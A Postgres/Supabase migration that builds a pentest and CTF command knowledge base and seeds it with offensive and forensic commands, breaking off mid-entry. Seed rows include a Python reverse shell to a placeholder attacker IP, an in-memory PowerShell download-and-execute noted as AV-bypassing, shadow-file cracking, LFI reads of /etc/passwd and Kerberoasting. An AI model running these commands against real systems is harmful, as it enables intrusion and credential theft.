-- COSMOS ARSENAL  Operator knowledge base (commands, techniques, playbooks).
-- Public read, admin write. Full-text search via generated tsvector.

CREATE TABLE IF NOT EXISTS public.arsenal_entries (
  id              UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
  title           TEXT NOT NULL,
  command         TEXT NOT NULL,
  description     TEXT,
  category        TEXT NOT NULL,
  subcategory     TEXT,
  tags            TEXT[] DEFAULT '{}',
  platform        TEXT[] DEFAULT '{}',
  difficulty      TEXT DEFAULT 'intermediate',
  mitre_id        TEXT,
  mitre_name      TEXT,
  note            TEXT,
  source_url      TEXT,
  use_case        TEXT DEFAULT 'both',
  published       BOOLEAN DEFAULT true,
  pinned          BOOLEAN DEFAULT false,
  usage_count     INTEGER DEFAULT 0,
  created_at      TIMESTAMPTZ DEFAULT NOW(),
  updated_at      TIMESTAMPTZ DEFAULT NOW(),
  fts             tsvector
);

-- Maintain `fts` via trigger. PostgreSQL refuses to use a STORED
-- generated column here because `array_to_string(tags, ' ')` isn't
-- considered strictly immutable inside generation expressions on
-- modern Supabase Postgres builds. A BEFORE INSERT/UPDATE trigger is
-- the supported workaround and produces the same on-disk tsvector.
CREATE OR REPLACE FUNCTION public.arsenal_entries_fts_refresh()
RETURNS trigger
LANGUAGE plpgsql
AS $$
BEGIN
  NEW.fts := to_tsvector(
    'english',
    coalesce(NEW.title, '') || ' ' ||
    coalesce(NEW.description, '') || ' ' ||
    coalesce(NEW.command, '') || ' ' ||
    coalesce(NEW.note, '') || ' ' ||
    coalesce(NEW.mitre_id, '') || ' ' ||
    coalesce(NEW.mitre_name, '') || ' ' ||
    coalesce(array_to_string(NEW.tags, ' '), '')
  );
  RETURN NEW;
END;
$$;

DROP TRIGGER IF EXISTS arsenal_entries_fts_trg ON public.arsenal_entries;
CREATE TRIGGER arsenal_entries_fts_trg
  BEFORE INSERT OR UPDATE OF title, description, command, note, mitre_id, mitre_name, tags
  ON public.arsenal_entries
  FOR EACH ROW
  EXECUTE FUNCTION public.arsenal_entries_fts_refresh();

CREATE INDEX IF NOT EXISTS idx_arsenal_category   ON public.arsenal_entries (category);
CREATE INDEX IF NOT EXISTS idx_arsenal_tags       ON public.arsenal_entries USING GIN (tags);
CREATE INDEX IF NOT EXISTS idx_arsenal_platform   ON public.arsenal_entries USING GIN (platform);
CREATE INDEX IF NOT EXISTS idx_arsenal_difficulty ON public.arsenal_entries (difficulty);
CREATE INDEX IF NOT EXISTS idx_arsenal_mitre      ON public.arsenal_entries (mitre_id);
CREATE INDEX IF NOT EXISTS idx_arsenal_published  ON public.arsenal_entries (published);
CREATE INDEX IF NOT EXISTS idx_arsenal_pinned     ON public.arsenal_entries (pinned);
CREATE INDEX IF NOT EXISTS idx_arsenal_fts        ON public.arsenal_entries USING GIN (fts);

CREATE TABLE IF NOT EXISTS public.arsenal_stats (
  id          UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
  stat_key    TEXT NOT NULL UNIQUE,
  stat_value  BIGINT DEFAULT 0,
  updated_at  TIMESTAMPTZ DEFAULT NOW()
);

INSERT INTO public.arsenal_stats (stat_key, stat_value) VALUES
  ('total_entries', 0),
  ('total_copies', 0),
  ('total_categories', 0)
ON CONFLICT (stat_key) DO NOTHING;

ALTER TABLE public.arsenal_entries ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "arsenal_public_read" ON public.arsenal_entries;
DROP POLICY IF EXISTS "arsenal_admin_all"   ON public.arsenal_entries;
CREATE POLICY "arsenal_public_read" ON public.arsenal_entries FOR SELECT USING (published = true);
CREATE POLICY "arsenal_admin_all"   ON public.arsenal_entries FOR ALL    USING (auth.role() = 'authenticated');

ALTER TABLE public.arsenal_stats ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "arsenal_stats_public_read"  ON public.arsenal_stats;
DROP POLICY IF EXISTS "arsenal_stats_admin_write"  ON public.arsenal_stats;
CREATE POLICY "arsenal_stats_public_read"  ON public.arsenal_stats FOR SELECT USING (true);
CREATE POLICY "arsenal_stats_admin_write"  ON public.arsenal_stats FOR ALL    USING (auth.role() = 'authenticated');

-- Public-callable RPC: increments per-entry + global copy counter.
-- SECURITY DEFINER so anonymous visitors can record copy events without
-- needing write RLS on the rows.
CREATE OR REPLACE FUNCTION public.increment_arsenal_usage(entry_id UUID)
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  UPDATE public.arsenal_entries
     SET usage_count = usage_count + 1
   WHERE id = entry_id AND published = true;

  UPDATE public.arsenal_stats
     SET stat_value = stat_value + 1,
         updated_at = NOW()
   WHERE stat_key = 'total_copies';
END;
$$;

GRANT EXECUTE ON FUNCTION public.increment_arsenal_usage(UUID) TO anon, authenticated;

-- ─────────────────────────────────────────────────────────────────────
-- Seed data. Uses E'…' escape strings so \n renders as a real newline
-- and \" / \\ behave like in C. Idempotent via title-based de-dupe.
-- ─────────────────────────────────────────────────────────────────────

INSERT INTO public.arsenal_entries
  (title, command, description, category, subcategory, tags, platform, difficulty, mitre_id, mitre_name, note, use_case)
VALUES
-- RECON
('Nmap  Full TCP port scan with version detection',
 E'nmap -sV -sC -p- --min-rate 5000 -oA scan_results <target>',
 'Scans all 65535 TCP ports with service version detection and default scripts. -oA saves output in all three formats.',
 'recon','port-scanning',
 ARRAY['nmap','tcp','version-detection','scripts'], ARRAY['linux','macos'], 'intermediate',
 'T1046','Network Service Discovery',
 'Drop --min-rate on real engagements to avoid detection. Use -oA always  you will want that .gnmap later.',
 'offensive'),
('Nmap  UDP top 20 ports',
 E'nmap -sU --top-ports 20 -oA udp_scan <target>',
 'Scans the 20 most common UDP ports. UDP is slow  be patient.',
 'recon','port-scanning',
 ARRAY['nmap','udp'], ARRAY['linux','macos'], 'intermediate',
 'T1046','Network Service Discovery',
 'Often missed. SNMP (161), TFTP (69), NTP (123) hide here.',
 'offensive'),
('Nmap  Stealth SYN scan with OS detection',
 E'sudo nmap -sS -O -p- --min-rate 3000 <target>',
 'SYN scan (half-open, less noisy) with OS fingerprinting. Requires root.',
 'recon','port-scanning',
 ARRAY['nmap','syn-scan','os-detection','stealth'], ARRAY['linux'], 'advanced',
 'T1046','Network Service Discovery',
 'SYN scan does not complete the TCP handshake  less likely to appear in application logs.',
 'offensive'),
('Gobuster  Directory bruteforce',
 E'gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -o gobuster_out.txt',
 'Brute-forces directories and files. -x adds extension fuzzing.',
 'recon','web-recon',
 ARRAY['gobuster','web','directory-bruteforce','fuzzing'], ARRAY['linux'], 'beginner',
 'T1595','Active Scanning',
 'Switch to /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt for better results.',
 'offensive'),
('Ffuf  Virtual host fuzzing',
 E'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<target> -H "Host: FUZZ.<domain>" -fw <baseline_word_count>',
 'Discovers virtual hosts by fuzzing the Host header. Filter by word count to remove false positives.',
 'recon','web-recon',
 ARRAY['ffuf','vhost','subdomain','fuzzing'], ARRAY['linux','macos'], 'intermediate',
 'T1595','Active Scanning',
 'Get the baseline word count from a single clean request first. Use -fc to filter HTTP status codes too.',
 'offensive'),
('Whatweb  Web technology fingerprinting',
 E'whatweb -a 3 http://<target>',
 'Identifies CMS, frameworks, server software, headers. -a 3 is aggressive mode.',
 'recon','web-recon',
 ARRAY['whatweb','fingerprinting','web','cms'], ARRAY['linux'], 'beginner',
 NULL, NULL,
 'Quick way to ID WordPress, Drupal, Joomla versions before going deeper.',
 'offensive'),

-- ENUMERATION
('SMB  Enumerate shares with null session',
 E'smbclient -L \\\\<target>\\ -N',
 'Lists SMB shares without authentication (null session).',
 'enumeration','smb',
 ARRAY['smb','smbclient','shares','null-session'], ARRAY['linux'], 'beginner',
 'T1135','Network Share Discovery',
 'Follow up with smbmap -H <target> -u "" -p "" for permissions map.',
 'offensive'),
('SMB  Enumerate with enum4linux-ng',
 E'enum4linux-ng -A <target>',
 'Full SMB/LDAP enumeration: users, groups, shares, password policy, OS info.',
 'enumeration','smb',
 ARRAY['enum4linux','smb','users','groups','ldap'], ARRAY['linux'], 'intermediate',
 'T1018','Remote System Discovery',
 'enum4linux-ng is the maintained fork. Use -A for everything. Grab usernames  useful for password spraying.',
 'offensive'),
('SNMP  Walk community string',
 E'snmpwalk -c public -v1 <target>',
 'Walks the full SNMP MIB tree using the default community string "public".',
 'enumeration','snmp',
 ARRAY['snmp','snmpwalk','community-string'], ARRAY['linux'], 'beginner',
 'T1602','Data from Configuration Repository',
 'Also try strings: "private", "manager". onesixtyone can brute-force community strings.',
 'offensive'),
('Ldapsearch  Anonymous LDAP query',
 E'ldapsearch -x -H ldap://<target> -b "dc=<domain>,dc=<tld>" "(objectClass=*)"',
 'Queries LDAP anonymously for all objects. Replace dc values with target domain.',
 'enumeration','ldap',
 ARRAY['ldap','ldapsearch','active-directory','anonymous'], ARRAY['linux'], 'intermediate',
 'T1018','Remote System Discovery',
 'If anonymous bind is allowed, you can dump the entire AD structure. Look for user objects and their attributes.',
 'offensive'),
('Netcat  Banner grabbing',
 E'nc -nv <target> <port>',
 'Simple banner grab. Connect to a port and read whatever the service sends.',
 'enumeration','service-enum',
 ARRAY['netcat','nc','banner','grabbing'], ARRAY['linux','macos'], 'beginner',
 'T1046','Network Service Discovery',
 'Works for SSH, FTP, SMTP, HTTP. Just connect and wait.',
 'offensive'),

-- PRIVILEGE ESCALATION
('LinPEAS  Linux privilege escalation script',
 E'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
 'Automated Linux privilege escalation enumeration. Checks SUID, cron, writable paths, sudo, capabilities.',
 'privilege-escalation','linux',
 ARRAY['linpeas','linux','privesc','automated'], ARRAY['linux'], 'beginner',
 'T1548','Abuse Elevation Control Mechanism',
 'Also transfer the script manually: wget, curl, python3 -m http.server on attacker machine.',
 'offensive'),
('Sudo  Check allowed commands',
 E'sudo -l',
 'Lists commands the current user can run with sudo. Check GTFOBins for each result.',
 'privilege-escalation','linux',
 ARRAY['sudo','linux','privesc','gtfobins'], ARRAY['linux','macos'], 'beginner',
 'T1548.003','Sudo and Sudo Caching',
 'This is the FIRST thing to check on a Linux foothold. Always.',
 'offensive'),
('SUID  Find SUID binaries',
 E'find / -perm -u=s -type f 2>/dev/null',
 'Finds all SUID binaries on the system. Cross-reference each with GTFOBins.',
 'privilege-escalation','linux',
 ARRAY['suid','linux','privesc','find','gtfobins'], ARRAY['linux'], 'beginner',
 'T1548.001','Setuid and Setgid',
 'Pipe to grep -v proc to reduce noise. Then check GTFOBins for every single result.',
 'offensive'),
('Cron  Find writable cron paths',
 E'cat /etc/crontab && ls -la /etc/cron.* && find / -name "*.sh" -writable 2>/dev/null',
 'Checks system cron jobs and finds writable shell scripts that may be executed by root cron.',
 'privilege-escalation','linux',
 ARRAY['cron','linux','privesc','writable'], ARRAY['linux'], 'intermediate',
 'T1053.003','Cron',
 'If a root cron calls a script you can write to  you own root. Check permissions carefully.',
 'offensive'),
('WinPEAS  Windows privilege escalation',
 E'winPEASx64.exe > winpeas_out.txt',
 'Automated Windows privilege escalation enumeration. Checks services, registry, credentials, tokens.',
 'privilege-escalation','windows',
 ARRAY['winpeas','windows','privesc','automated'], ARRAY['windows'], 'beginner',
 'T1548','Abuse Elevation Control Mechanism',
 'Run from a writable directory. winPEASany.exe works on 32-bit too. Check for credentials in output.',
 'offensive'),
('Windows  Check token privileges',
 E'whoami /priv',
 'Lists current user token privileges. SeImpersonatePrivilege = likely path to SYSTEM.',
 'privilege-escalation','windows',
 ARRAY['windows','token','privileges','impersonate','system'], ARRAY['windows'], 'intermediate',
 'T1134','Access Token Manipulation',
 'SeImpersonatePrivilege → try PrintSpoofer or GodPotato. SeBackupPrivilege → SAM dump.',
 'offensive'),

-- WEB
('SQLMap  Basic SQL injection scan',
 E'sqlmap -u "http://<target>/page?id=1" --dbs --batch',
 'Automatically detects and exploits SQL injection. --dbs enumerates databases. --batch skips prompts.',
 'web','sqli',
 ARRAY['sqlmap','sqli','database','injection'], ARRAY['linux','macos'], 'beginner',
 'T1190','Exploit Public-Facing Application',
 'Add --level=5 --risk=3 for thoroughness. Use --dump -D <db> -T <table> to extract data.',
 'offensive'),
('JWT  Decode token (no verification)',
 E'echo "<jwt_token>" | cut -d "." -f1,2 | tr "." "\\n" | while read part; do echo $part | base64 -d 2>/dev/null; echo; done',
 'Decodes JWT header and payload without signature verification.',
 'web','jwt',
 ARRAY['jwt','decode','base64','token'], ARRAY['linux','macos'], 'beginner',
 'T1528','Steal Application Access Token',
 'Also use the JWT tool in COSMOS or jwt.io. Look for alg:none, weak secrets, or sensitive data in payload.',
 'both'),
('LFI  Basic path traversal test',
 E'curl "http://<target>/page?file=../../../../etc/passwd"',
 'Tests for Local File Inclusion via path traversal to read /etc/passwd.',
 'web','lfi',
 ARRAY['lfi','path-traversal','curl','linux'], ARRAY['linux','macos'], 'beginner',
 'T1083','File and Directory Discovery',
 'If filtered: try ....// (double traversal), URL encode the slashes (%2F), or use php://filter wrapper.',
 'offensive'),
('Burp  Match and Replace for security header bypass',
 E'# Burp Suite: Proxy → Match and Replace\nMatch: X-Forwarded-For: .*\nReplace: X-Forwarded-For: 127.0.0.1',
 'Adds or overrides X-Forwarded-For header to simulate localhost access for IP-restricted endpoints.',
 'web','headers',
 ARRAY['burp','headers','bypass','x-forwarded-for','localhost'], ARRAY['any'], 'intermediate',
 'T1190','Exploit Public-Facing Application',
 'Also try: X-Real-IP, X-Original-IP, X-Remote-Addr, Forwarded: for=127.0.0.1',
 'offensive'),

-- REVERSE ENGINEERING
('File  Identify binary type',
 E'file <binary>',
 'Identifies the true file type regardless of extension. ELF, PE, scripts, archives.',
 'reverse-engineering','static-analysis',
 ARRAY['file','binary','identification','static'], ARRAY['linux','macos'], 'beginner',
 NULL, NULL,
 'Always run this first. Extension means nothing. Follow with strings and checksec.',
 'both'),
('Strings  Extract printable strings from binary',
 E'strings -n 8 <binary> | tee strings_out.txt',
 'Extracts all printable strings of 8+ chars. Often reveals hardcoded credentials, URLs, C2 addresses.',
 'reverse-engineering','static-analysis',
 ARRAY['strings','static-analysis','binary','credentials'], ARRAY['linux','macos'], 'beginner',
 'T1027','Obfuscated Files or Information',
 'Start with -n 8 to reduce noise. Pipe to grep for IPs (grep -oE "([0-9]{1,3}\\.){3}[0-9]{1,3}").',
 'both'),
('Checksec  Check binary protections',
 E'checksec --file=<binary>',
 'Reports enabled security mitigations: ASLR, NX, PIE, stack canaries, RELRO.',
 'reverse-engineering','binary-analysis',
 ARRAY['checksec','binary','aslr','nx','pie','canary','mitigations'], ARRAY['linux'], 'intermediate',
 NULL, NULL,
 'No PIE + No NX + No Canary = classic buffer overflow playground. This tells you the attack surface.',
 'both'),
('Ghidra  Batch headless analysis',
 E'analyzeHeadless <project_dir> <project_name> -import <binary> -postScript PrintFunctionNames.java',
 'Runs Ghidra analysis without the GUI. Useful for scripting bulk analysis.',
 'reverse-engineering','ghidra',
 ARRAY['ghidra','headless','static-analysis','disassembly'], ARRAY['linux','macos','windows'], 'advanced',
 'T1027','Obfuscated Files or Information',
 'Run the GUI version first to understand the binary, then automate with headless for batches.',
 'both'),
('Radare2  Open binary and analyze',
 E'r2 -A <binary>',
 'Opens binary in radare2 with full analysis (-A runs aaa). Start here for interactive disassembly.',
 'reverse-engineering','radare2',
 ARRAY['radare2','r2','disassembly','static-analysis'], ARRAY['linux','macos'], 'intermediate',
 NULL, NULL,
 'Key commands: afl (list functions), pdf @ main (disassemble main), iz (strings), ii (imports). q to quit.',
 'both'),
('GDB + pwndbg  Debug with pwndbg plugin',
 E'gdb -q <binary>\n# Inside gdb:\nrun\ninfo registers\nx/20x $rsp    # examine stack\nbt             # backtrace',
 'Opens binary in GDB with pwndbg plugin for enhanced output. Essential for dynamic analysis.',
 'reverse-engineering','debugging',
 ARRAY['gdb','pwndbg','debugging','dynamic-analysis','stack'], ARRAY['linux'], 'intermediate',
 NULL, NULL,
 'Install pwndbg: git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh',
 'both'),
('ltrace  Trace library calls',
 E'ltrace ./<binary>',
 'Intercepts and logs all library function calls (malloc, strcmp, printf, etc.) as the program runs.',
 'reverse-engineering','dynamic-analysis',
 ARRAY['ltrace','library-calls','dynamic-analysis','tracing'], ARRAY['linux'], 'intermediate',
 NULL, NULL,
 'Great for finding strcmp calls that check passwords. strcmp("input", "secret") shows the secret.',
 'both'),
('strace  Trace system calls',
 E'strace -e trace=open,read,write,execve ./<binary>',
 'Intercepts system calls. Filter with -e to focus on specific calls like file opens and network.',
 'reverse-engineering','dynamic-analysis',
 ARRAY['strace','syscalls','dynamic-analysis','tracing'], ARRAY['linux'], 'intermediate',
 NULL, NULL,
 'Use -o strace_out.txt to save output. Good for seeing what files malware opens on startup.',
 'both'),

-- MALWARE ANALYSIS
('PEStudio  Static PE analysis',
 E'# Windows GUI tool\n# Open malware sample → inspect: imports, exports, strings, indicators, entropy',
 'Static analysis of PE (Windows) executables. Shows suspicious imports, strings, entropy, digital signature.',
 'malware-analysis','static',
 ARRAY['pestudio','pe','windows','static-analysis','imports','entropy'], ARRAY['windows'], 'beginner',
 'T1027','Obfuscated Files or Information',
 'High entropy sections (>7.0) indicate packing or encryption. Check for suspicious imports: VirtualAlloc, WriteProcessMemory, CreateRemoteThread.',
 'both'),
('Detect-It-Easy  Packer identification',
 E'die <binary>         # Detect-It-Easy CLI\n# Or: diec <binary>  # console version',
 'Identifies packers, compilers, cryptors used on PE files. Tells you if unpacking is needed.',
 'malware-analysis','static',
 ARRAY['die','detect-it-easy','packer','pe','identification'], ARRAY['linux','windows'], 'beginner',
 'T1027.002','Software Packing',
 'If UPX packed: upx -d <binary> to unpack. Other packers need OllyDbg/x64dbg dynamic unpacking.',
 'both'),
('FLARE-VM  Malware analysis sandbox setup (Windows)',
 E'# PowerShell (Run as Admin)\nSet-ExecutionPolicy Unrestricted -Force\nIEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1")',
 'Installs FLARE-VM  the complete Windows malware analysis environment with 100+ tools.',
 'malware-analysis','setup',
 ARRAY['flare-vm','windows','sandbox','setup','mandiant'], ARRAY['windows'], 'intermediate',
 NULL, NULL,
 'Run on a VM snapshot only. Disable AV first. Takes 1-2 hours to install. Worth it.',
 'both'),
('Capa  Identify malware capabilities',
 E'capa <malware_sample> -vv',
 'Identifies capabilities of a PE binary using rules mapped to MITRE ATT&CK and MBC.',
 'malware-analysis','static',
 ARRAY['capa','capabilities','mitre','static-analysis','mandiant'], ARRAY['linux','windows'], 'intermediate',
 NULL, NULL,
 'Outputs MITRE technique IDs directly. Perfect for writing malware analysis reports. Free from Mandiant.',
 'both'),

-- FORENSICS
('Volatility 3  Identify memory profile',
 E'python3 vol.py -f <dump.mem> windows.info',
 'Identifies OS version and build from a Windows memory dump.',
 'forensics','memory',
 ARRAY['volatility','memory-forensics','windows','profile'], ARRAY['linux','macos'], 'intermediate',
 'T1005','Data from Local System',
 'Volatility 3 does not need explicit profiles like v2. Use windows.* or linux.* plugin namespaces.',
 'defensive'),
('Volatility 3  List processes',
 E'python3 vol.py -f <dump.mem> windows.pslist\npython3 vol.py -f <dump.mem> windows.pstree',
 'Lists all running processes at time of memory capture. pstree shows parent-child relationships.',
 'forensics','memory',
 ARRAY['volatility','memory-forensics','processes','pslist','pstree'], ARRAY['linux','macos'], 'intermediate',
 'T1057','Process Discovery',
 'Look for: processes with random names, cmd.exe spawned from Word/Excel, PowerShell from unusual parents.',
 'defensive'),
('Volatility 3  Network connections from memory',
 E'python3 vol.py -f <dump.mem> windows.netstat',
 'Extracts network connections present in memory at time of capture.',
 'forensics','memory',
 ARRAY['volatility','memory-forensics','network','connections','netstat'], ARRAY['linux','macos'], 'intermediate',
 'T1049','System Network Connections Discovery',
 'Cross-reference unusual ports/IPs with your threat intel. C2 beaconing shows as ESTABLISHED outbound.',
 'defensive'),
('Binwalk  Extract embedded files from firmware/binary',
 E'binwalk -e <file>',
 'Identifies and extracts embedded files (ZIP, gzip, ELF, PNG, etc.) from any binary or firmware.',
 'forensics','file-analysis',
 ARRAY['binwalk','firmware','extraction','embedded','ctf'], ARRAY['linux'], 'beginner',
 NULL, NULL,
 'CTF staple. Always run on challenge files before anything else. Check _<file>.extracted/ after.',
 'both'),
('Foremost  Carve files from disk image',
 E'foremost -i <disk.img> -o ./output/ -t jpg,png,pdf,zip',
 'File carving tool that recovers files from disk images based on headers and footers.',
 'forensics','disk',
 ARRAY['foremost','file-carving','disk-forensics','recovery'], ARRAY['linux'], 'intermediate',
 'T1005','Data from Local System',
 'Also try photorec for broader recovery. Check output directory  may recover thousands of files.',
 'defensive'),
('ExifTool  Extract metadata from any file',
 E'exiftool <file>\nexiftool -all= <file>   # Strip all metadata',
 'Extracts full metadata from images, PDFs, Office files, audio, video. Second form strips it all.',
 'forensics','metadata',
 ARRAY['exiftool','metadata','exif','forensics','steganography'], ARRAY['linux','macos','windows'], 'beginner',
 'T1592','Gather Victim Host Information',
 'GPS coordinates in EXIF can geolocate a photo. Author field in Office docs reveals usernames.',
 'both'),

-- STEGANOGRAPHY
('Steghide  Extract hidden data from image',
 E'steghide extract -sf <image.jpg> -p <password>\nsteghide extract -sf <image.jpg> -p ""   # empty password',
 'Extracts data hidden in JPEG/BMP/WAV files using steghide embedding.',
 'steganography','image',
 ARRAY['steghide','image','jpeg','hidden-data','stego','ctf'], ARRAY['linux'], 'beginner',
 NULL, NULL,
 'Try empty password first. Then rockyou.txt via stegcracker: stegcracker <file> /usr/share/wordlists/rockyou.txt',
 'both'),
('Zsteg  LSB stego analysis on PNG/BMP',
 E'zsteg <image.png>\nzsteg -a <image.png>   # try all methods',
 'Detects LSB (Least Significant Bit) steganography in PNG and BMP files.',
 'steganography','image',
 ARRAY['zsteg','lsb','png','stego','ctf'], ARRAY['linux'], 'beginner',
 NULL, NULL,
 '-a tries all bit planes and channels. Can take a while on large images.',
 'both'),
('Stegsolve  Visual image analysis (CTF)',
 E'# Download: wget http://www.caesum.com/handbook/Stegsolve.jar\njava -jar Stegsolve.jar',
 'GUI tool to analyze image bit planes, color channels, and LSB visually.',
 'steganography','image',
 ARRAY['stegsolve','image','bitplane','visual','ctf'], ARRAY['linux','macos','windows'], 'beginner',
 NULL, NULL,
 'Arrow keys cycle through bit planes. Look for hidden text or QR codes in individual bit channels.',
 'both'),
('Sonic Visualiser  Audio spectrogram analysis',
 E'# GUI: open .wav or .mp3 → Layer → Add Spectrogram\n# Look for text/image hidden in spectrogram',
 'Visualizes audio files as spectrograms. Hidden images or text often visible in frequency domain.',
 'steganography','audio',
 ARRAY['sonic-visualiser','audio','spectrogram','stego','ctf'], ARRAY['linux','macos','windows'], 'beginner',
 NULL, NULL,
 'CTF classic. If audio sounds like random beeps/tones, open the spectrogram immediately.',
 'both'),

-- CRYPTOGRAPHY
('Hashcat  Crack hash with rockyou',
 E'hashcat -m <hash_type> <hash_file> /usr/share/wordlists/rockyou.txt --force',
 'Cracks hashes using dictionary attack. -m specifies hash type (0=MD5, 1000=NTLM, 1800=sha512crypt).',
 'cryptography','hash-cracking',
 ARRAY['hashcat','cracking','hash','rockyou','dictionary'], ARRAY['linux','windows'], 'beginner',
 'T1110.002','Password Cracking',
 'Common modes: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt(linux), 13100=Kerberoast. Use --show after to display cracked.',
 'offensive'),
('John the Ripper  Crack shadow file',
 E'unshadow /etc/passwd /etc/shadow > hashes.txt\njohn hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt',
 'Combines passwd and shadow files then cracks with wordlist.',
 'cryptography','hash-cracking',
 ARRAY['john','shadow','passwd','cracking','linux'], ARRAY['linux'], 'beginner',
 'T1110.002','Password Cracking',
 'john --show hashes.txt to display cracked passwords after. Also supports zip2john, ssh2john, keepass2john.',
 'offensive'),
('CyberChef  Identify encoding chain',
 E'# CyberChef: https://gchq.github.io/CyberChef/\n# Operations: "Magic" → auto-detects encoding chain\n# Common chain: Base64 → ROT13 → XOR → Base64',
 'Use CyberChef Magic operation to auto-detect and decode unknown encoding chains.',
 'cryptography','encoding',
 ARRAY['cyberchef','encoding','base64','rot13','magic','ctf'], ARRAY['any'], 'beginner',
 NULL, NULL,
 'Magic operation is your first stop for any unknown encoded string in CTFs. Does not always get it right.',
 'both'),

-- ACTIVE DIRECTORY
('BloodHound  Collect AD data with SharpHound',
 E'# On Windows target:\nSharpHound.exe -c All --zipfilename bh_data.zip\n# On Linux:\npython3 bloodhound.py -d <domain> -u <user> -p <pass> -ns <dc_ip> -c all',
 'Collects Active Directory relationship data for BloodHound graph analysis.',
 'active-directory','enumeration',
 ARRAY['bloodhound','sharphound','active-directory','ad','graph'], ARRAY['windows','linux'], 'intermediate',
 'T1087.002','Domain Account Discovery',
 'Import the ZIP into BloodHound. First query: "Find Shortest Paths to Domain Admin". Always run this.',
 'offensive'),
('Kerberoasting  Request service tickets',
 E'# Impacket:\npython3 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerberoast.txt\n# Then crack:\nhashcat -m 13100 kerberoast.txt rockyou.txt',
 'Requests Kerberos service tickets for accounts with SPNs. Cracks offline to get plaintext passwords.',
 'active-directory','kerberos',
 ARRAY['kerberoasting','kerberos','spn','impacket','active-directory'], ARRAY['linux'], 'advanced',
 'T1558.003','Kerberoasting',
 'Service accounts often have weak passwords and high privileges. Always try Kerberoasting after getting any AD foothold.',
 'offensive'),

-- DFIR
('Windows  Collect system triage (KAPE)',
 E'kape.exe --tsource C: --tdest <output_dir> --tflush --target !BasicCollection',
 'Collects key forensic artifacts from a live Windows system using KAPE triage collection.',
 'dfir','triage',
 ARRAY['kape','windows','triage','collection','dfir','artifacts'], ARRAY['windows'], 'intermediate',
 'T1005','Data from Local System',
 'Run as admin. BasicCollection grabs event logs, prefetch, registry, browser history, LNK files.',
 'defensive'),
('Windows Event Logs  Find logon events',
 E'Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | Select-Object -First 20 | Format-List',
 'PowerShell: retrieves Windows Security logon events (Event ID 4624). Shows who logged in and when.',
 'dfir','event-logs',
 ARRAY['windows','event-logs','powershell','logon','security','4624'], ARRAY['windows'], 'intermediate',
 'T1078','Valid Accounts',
 'Key event IDs: 4624=logon, 4625=failed logon, 4648=explicit creds used, 4768=kerberos ticket, 4776=NTLM.',
 'defensive'),
('Wireshark  Filter HTTP POST requests',
 E'# Wireshark display filter:\nhttp.request.method == "POST"\n# With credentials:\nhttp contains "password"\n# Follow stream: Right-click → Follow → TCP Stream',
 'Filters captured traffic to show only HTTP POST requests, useful for credential harvesting in DFIR/CTF.',
 'dfir','network-forensics',
 ARRAY['wireshark','http','pcap','network-forensics','credentials','filter'], ARRAY['linux','macos','windows'], 'beginner',
 'T1040','Network Sniffing',
 'Always try HTTP stream follow first in CTF PCAPs. Credentials often in plaintext in POST bodies.',
 'both'),
('Tshark  Extract HTTP objects from PCAP',
 E'tshark -r <file.pcap> --export-objects http,./exported_files/',
 'Extracts all HTTP transferred files (images, scripts, executables) from a PCAP capture.',
 'dfir','network-forensics',
 ARRAY['tshark','pcap','http','export','network-forensics','ctf'], ARRAY['linux','macos'], 'intermediate',
 'T1040','Network Sniffing',
 'Also: tshark -r file.pcap -Y "http" -T fields -e http.request.uri to list all URLs.',
 'both'),

-- SCRIPTING
('Python  Reverse shell one-liner',
 E'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
 'Python3 reverse shell one-liner. Start a netcat listener before executing on target.',
 'scripting','reverse-shells',
 ARRAY['python','reverse-shell','one-liner','netcat'], ARRAY['linux','macos'], 'beginner',
 'T1059.006','Python',
 'Listener: nc -nvlp <port>. Also try revshells.com for all shell types.',
 'offensive'),
('Bash  Upgrade to fully interactive TTY',
 E'# Step 1: On target\npython3 -c \'import pty;pty.spawn("/bin/bash")\'\n# Step 2: Ctrl+Z (background)\n# Step 3: On attacker\nstty raw -echo; fg\n# Step 4: On target\nexport TERM=xterm\nstty rows 38 cols 116',
 'Upgrades a raw netcat shell to a fully interactive TTY with tab completion, Ctrl+C, and clear.',
 'scripting','shell-upgrade',
 ARRAY['tty','shell','upgrade','pty','bash','interactive'], ARRAY['linux'], 'intermediate',
 NULL, NULL,
 'Do this immediately after getting a shell. Raw shells lose you if you Ctrl+C by mistake.',
 'offensive'),
('PowerShell  Download and execute in memory',
 E'IEX (New-Object Net.WebClient).DownloadString("http://<attacker_ip>/<script>.ps1")',
 'Downloads and executes a PowerShell script entirely in memory without writing to disk.',
 'scripting','powershell',
 ARRAY['powershell','iex','fileless','memory','download'], ARRAY['windows'], 'intermediate',
 'T1059.001','PowerShell',
 'Fileless execution  bypasses many AV solutions. Combine with Set-ExecutionPolicy Bypass -Scope Process.',
 'offensive'),

-- OSINT
('Shodan  Search for vulnerable services',
 E'# Shodan search queries:\nproduct:"Apache httpd" version:"2.4.49"\norg:"<target_org>" port:22\ncountry:NP port:3389    # RDP in Nepal',
 'Shodan searches for internet-exposed services. Useful for recon on target organizations.',
 'osint','shodan',
 ARRAY['shodan','osint','recon','exposed-services','dorks'], ARRAY['any'], 'intermediate',
 'T1596','Search Open Technical Databases',
 'shodan.io  free account gives basic access. CLI: pip install shodan && shodan init <api_key>',
 'offensive'),
('TheHarvester  Email and subdomain harvesting',
